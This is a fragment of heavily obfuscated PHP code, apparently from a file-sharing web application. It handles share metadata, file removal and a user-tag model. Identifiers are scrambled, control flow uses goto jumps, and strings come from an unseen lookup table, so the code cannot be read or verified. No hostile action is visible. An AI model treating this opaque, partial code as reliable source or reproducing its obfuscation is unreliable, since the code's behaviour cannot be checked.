á‹[$eÄÃ³›Äïš[419]])) { $this->shareFileMeta($E‘‡ÇÕ á‹[$eÄÃ³›Äïš[419]], 0); } $this->remove($E‘‡ÇÕ á‹[$eÄÃ³›Äïš[441]]); return !0; } if ($FâÁ¦†Ï’Ì && $cˆ™–¢İã›[$eÄÃ³›Äïš[692]] == $eÄÃ³›Äïš[2256]) { $dã„ĞÂÈİ = $f•Şˆïİä¾[$eÄÃ³›Äïš[692]] == $eÄÃ³›Äïš[2256] ? 1 : 0; $this->shareFileMeta($E‘‡ÇÕ á‹[$eÄÃ³›Äïš[419]], $dã„ĞÂÈİ); $this->removeByFile($E‘‡ÇÕ á‹[$eÄÃ³›Äïš[419]]); } goto Fô‡’»Ê‡; Fô‡’»Ê‡: return $FâÁ¦†Ï’Ì; goto b³©˜Ó´÷; dõ¥‹ÌÉßá: $eÄÃ³›Äïš =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D‡˜…†ÅÑÕ = array($eÄÃ³›Äïš[367] => $cˆ™–¢İã›[$eÄÃ³›Äïš[367]]); $E‘‡ÇÕ á‹ = Model($eÄÃ³›Äïš[2250])->where($D‡˜…†ÅÑÕ)->field($eÄÃ³›Äïš[2259])->find(); goto c‚¡ÕÂÁø; b³©˜Ó´÷: } private function removeByFile($eÆ×“â‰ë„) { goto Bˆˆ‡¶Ú¨Œ; d¦Â‰Ñö¾: $Eè®ö©•µë = array_to_keyvalue($cíŸ–Å¤Š, $CÔíĞŒùø…[33], $CÔíĞŒùø…[441]); $this->remove($Eè®ö©•µë); goto b’ôĞ¾í¯; Bˆˆ‡¶Ú¨Œ: $CÔíĞŒùø… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cíŸ–Å¤Š = Model($CÔíĞŒùø…[756])->where(array($CÔíĞŒùø…[419] => $eÆ×“â‰ë„))->field($CÔíĞŒùø…[369])->select(); $aÑ‰‹ÖŸ³² = array_to_keyvalue($cíŸ–Å¤Š, $CÔíĞŒùø…[33], $CÔíĞŒùø…[369]); goto A¯—¯·×„; A¯—¯·×„: $CÀ¶”ò˜®á = array($CÔíĞŒùø…[369] => array($CÔíĞŒùø…[7], $aÑ‰‹ÖŸ³²), $CÔíĞŒùø…[446] => 1); $cíŸ–Å¤Š = Model($CÔíĞŒùø…[2090])->where($CÀ¶”ò˜®á)->field($CÔíĞŒùø…[441])->select(); if (empty($cíŸ–Å¤Š)) { return; } goto d¦Â‰Ñö¾; b’ôĞ¾í¯: } private function shareFileMeta($A‚Äš¨Æïä, $f‰›Ë¬‹Ø´ = null) { $c†ÁË×ğ‡Š =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FŞßö±î‚´ = array($c†ÁË×ğ‡Š[419] => $A‚Äš¨Æïä, $c†ÁË×ğ‡Š[89] => $c†ÁË×ğ‡Š[2260]); if (is_null($f‰›Ë¬‹Ø´)) { return Model($c†ÁË×ğ‡Š[2261])->where($FŞßö±î‚´)->find(); } $FŞßö±î‚´[$c†ÁË×ğ‡Š[359]] = $f‰›Ë¬‹Ø´; Model($c†ÁË×ğ‡Š[2261])->add($FŞßö±î‚´, array(), !0); } } goto dëˆá«¬Ôù; e¡ß¯Ö¹ß…: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($cÑÂƒ°á¸ç) { $d¸¦…‚‡í… =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($d¸¦…‚‡í…[2498] => array(USER_ID, $d¸¦…‚‡í…[2553])); } protected function listData() { $eàîƒù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bù²ÏÒñòá = array($eàîƒù[1436] => USER_ID, $eàîƒù[436] => array($eàîƒù[2554], 0)); $A³®´Ê‰å = $eàîƒù[2555]; $aÁò¹ÂÓ‘À = $eàîƒù[2556]; $bå³¥¹…á = $this->field($A³®´Ê‰å)->where($Bù²ÏÒñòá)->order($aÁò¹ÂÓ‘À)->select(); return $bå³¥¹…á ? $bå³¥¹…á : array(); } protected function listByTag($a­†¡İ¿«¯) { } protected function addToTag($Aë‘Â‡‰Ÿ, $AáÑÉİ…ö ) { $a“ÄàÁ ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!Model($a“ÄàÁ ù[2326])->listData($AáÑÉİ…ö ) || !Model($a“ÄàÁ ù[756])->pathInfo($Aë‘Â‡‰Ÿ)) { return !1; } $BÃœÉÚ­Å„ = array($a“ÄàÁ ù[1436] => USER_ID, $a“ÄàÁ ù[436] => $AáÑÉİ…ö , $a“ÄàÁ ù[387] => $Aë‘Â‡‰Ÿ, $a“ÄàÁ ù[388] => $a“ÄàÁ ù[382], $a“ÄàÁ ù[386] => $a“ÄàÁ ù[33], $a“ÄàÁ ù[2117] => 0); if ($this->where($BÃœÉÚ­Å„)->find()) { return !1; } return $this->add($BÃœÉÚ­Å„); } protected function removeFromTag($d¨óŠƒÈß, $BÀ°È­Í‘¨) { $Cïìå®ö¨ñ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!Model($Cïìå®ö¨ñ[2326])->listData($BÀ°È­Í‘¨)) { return !1; } if (is_array($d¨óŠƒÈß)) { $d¨óŠƒÈß = array($Cïìå®ö¨ñ[7], $d¨óŠƒÈß); } $B¥ÈÒßÙİ = array($Cïìå®ö¨ñ[1436] => USER_ID, $Cïìå®ö¨ñ[436] => $BÀ°È­Í‘¨, $Cïìå®ö¨ñ[388] => $Cïìå®ö¨ñ[382], $Cïìå®ö¨ñ[387] => $d¨óŠƒÈß); return $this->where($B¥ÈÒßÙİ)->delete(); } protected function removeByTag($d±ØŞ…Ş£) { $b£¾‚Òº¹Ô =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$d±ØŞ…Ş£) { return !1; } $dƒ›à¤Š“› = array($b£¾‚Òº¹Ô[1436] => USER_ID, $b£¾‚Òº¹Ô[436] => $d±ØŞ…Ş£); return $this->where($dƒ›à¤Š“›)->delete(); } protected function removeBySource($dö¡•‰‘’¶) { $b’Å°§ø¾§ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f£¾îéº‰³ = array($b’Å°§ø¾§[1436] => USER_ID, $b’Å°§ø¾§[387] => $dö¡•‰‘’¶, $b’Å°§ø¾§[436] => array($b’Å°§ø¾§[932], 0)); return $this->where($f£¾îéº‰³)->delete(); } }